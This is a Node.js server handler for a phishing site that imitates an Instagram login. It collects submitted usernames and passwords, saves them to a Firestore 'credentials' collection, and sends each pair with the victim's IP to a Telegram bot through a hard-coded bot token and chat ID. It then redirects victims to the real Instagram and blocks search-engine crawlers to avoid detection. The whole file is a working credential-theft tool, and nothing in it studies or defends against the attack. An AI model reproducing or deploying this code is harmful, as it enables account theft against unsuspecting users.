const fetch = require('node-fetch');
const admin = require('firebase-admin');

// Initialize Firebase
const serviceAccount = require('../firebase.json'); // Path to your service account key
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
});
const db = admin.firestore();

module.exports = async (req, res) => {
    // Block known bots
    const userAgent = req.headers['user-agent'] || '';
    const botPatterns = /Googlebot|bingbot|Baiduspider|SemrushBot|AhrefsBot/i;
    if (botPatterns.test(userAgent)) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    if (req.method === 'POST') {
        // Parse form data
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: 'Missing credentials' });
        }

        // Prepare credential log
        const log = {
            username,
            password,
            time: new Date().toISOString(),
            ip: req.headers['x-forwarded-for'] || 'unknown'
        };

        // Store in Firestore
        try {
            await db.collection('credentials').add(log);
            console.log('Credentials stored:', log);
        } catch (error) {
            console.error('Firestore error:', error);
        }

        // Send to Telegram
        const telegramBotToken = '7485509054:AAH1SH2jvtEFWrYJDXj_7xh2jVo8u71N2Os'; // Replace with your bot token
        const chatId = '8168729210'; // Replace with your chat ID
        if (telegramBotToken && chatId) {
            const message = encodeURIComponent(`New Instagram Creds:\nUsername: ${username}\nPassword: ${password}\nIP: ${log.ip}\nTime: ${log.time}`);
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
            await fetch(telegramUrl);
        }

        // Redirect to Instagram
        res.redirect(302, 'https://www.instagram.com');
    } else {
        // Redirect to index for non-POST requests
        res.redirect(302, '/');
    }
};